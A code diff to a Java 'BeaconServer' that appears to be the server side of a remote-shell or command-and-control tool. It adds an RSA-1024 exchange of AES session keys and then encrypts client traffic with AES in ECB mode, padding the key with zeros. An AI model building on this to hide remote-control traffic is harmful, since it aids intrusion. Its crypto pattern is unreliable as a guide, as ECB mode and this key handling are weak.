@@ -3,6 +3,8 @@ package Servers.Beacon;
 import java.util.Scanner;
 import Servers.Duplexer;
 import Servers.notifyLock;
+import Servers.encryption.aes.*;
+import Servers.encryption.rsa.*;
 
 import java.io.Console;
 import java.io.IOException;
@@ -42,6 +44,9 @@ public class BeaconServer implements Runnable{
     // ID used to make sure that .notify() is not called when it shouldn't
     private int shellID;
 
+    // RSA object used for rsa encryption to transfer AES keys with clients
+    private rsa rsa;
+
     // Text colors for Hard visuals
     private String GREEN = "\u001B[32m";
     private String RESET = "\u001B[37m";
@@ -72,6 +77,7 @@ public class BeaconServer implements Runnable{
             settingUpLock.notify();
         }
         this.shellID = 0;
+        this.rsa = new rsa(1024);
     }
 
     /**
@@ -411,8 +417,22 @@ public class BeaconServer implements Runnable{
                         // Create object used for notifying/waiting when user wants responses back immeediately
                         Object shellLockObject = new Object();
 
+                        // Send public key to client
+                        duplexer.send(rsa.getN(), true);
+                        duplexer.send(rsa.getE(), true);
+                        
+                        // Beacon key will encrypt the AES session key with the RSA public key
+                        String x = duplexer.receive(true);
+                        x = x.substring(0, x.length() - 1);
+                        
+                        String key = rsa.decrypt(x);
+                        while(key.length() % 8 != 0){
+                            key = "0" + key;
+                        }
+                        aes aes = new aes(key, modes.ECB);
+
                         // Create new Beacon Client Handler Thread to handle this connection between the Beacon and the client
-                        BeaconClientHandler clientHandler = new BeaconClientHandler(IPAddress, duplexer, this, OSMessage, shellLockObject);
+                        BeaconClientHandler clientHandler = new BeaconClientHandler(IPAddress, duplexer, this, OSMessage, shellLockObject, aes);
                         Thread clientHandlerThread = new Thread(clientHandler);
                         clientHandlerThread.start();
     
